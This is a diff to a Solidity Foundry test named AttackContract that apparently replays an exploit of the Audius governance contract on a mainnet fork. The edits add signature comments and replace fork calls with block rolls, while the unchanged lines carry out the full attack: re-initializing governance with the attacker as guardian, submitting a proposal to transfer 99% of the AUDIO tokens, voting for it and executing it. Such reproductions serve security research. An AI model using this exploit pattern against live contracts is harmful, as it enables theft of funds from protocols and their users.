@@ -78,15 +78,31 @@ contract AttackContract is Test {
         console.log("-> votingPeriod : 3 blocks");
         console.log("-> executionDelay : 0 block");
         console.log("-> guardianAddress : self");
+        // function initialize(
+            // address _registryAddress,
+            // uint256 _votingPeriod,
+            // uint256 _executionDelay,
+            // uint256 _votingQuorumPercent,
+            // uint16 _maxInProgressProposals,
+            // address _guardianAddress
+        // )
         IGovernence(governance).initialize(address(this), 3, 0, 1, 4, address(this));
         
-        console.log("Evaluate Proposal...");
+        console.log("Evaluate Proposal..."); // this is to make sure one can submit new proposals
         IGovernence(governance).evaluateProposalOutcome(84);    // callback this.getContract()
         
         uint256 audioBalance_gov = IERC20(AUDIO).balanceOf(governance);
         uint256 stealAmount = audioBalance_gov * 99 / 1e2;   // Steal 99% of AUDIO Token from governance address
 
         console.log("Submit Proposal...");
+        // function submitProposal(
+        //     bytes32 _targetContractRegistryKey,
+        //     uint256 _callValue,
+        //     string calldata _functionSignature,
+        //     bytes calldata _callData,
+        //     string calldata _name,
+        //     string calldata _description
+        // ) external returns (uint256)
         IGovernence(governance).submitProposal(bytes32(uint(3078)), 0, "transfer(address,uint256)", abi.encode(address(this), stealAmount), "Hello", "World");
 
         IStaking(staking).initialize(address(this), address(this));
@@ -96,12 +112,12 @@ contract AttackContract is Test {
 
         console.log("-------------------- Tx2 --------------------");
         console.log("SubmitVote `Yes` for malicious ProposalId 85...");
-        cheat.createSelectFork("mainnet", 15201795);
+        cheat.roll(15201795);
         IGovernence(governance).submitVote(85, IGovernence.Vote(2));    // Voting Yes
 
         console.log("-------------------- Tx3 --------------------");
         console.log("Execute malicious ProposalId 85...");
-        cheat.createSelectFork("mainnet", 15201798);
+        cheat.roll(15201798);
         IGovernence(governance).evaluateProposalOutcome(85);    // callback this.getContract()
         uint256 audioBalance_this = IERC20(AUDIO).balanceOf(address(this));
         emit log_named_decimal_uint("AttackContract AUDIO Balance", audioBalance_this, 18);
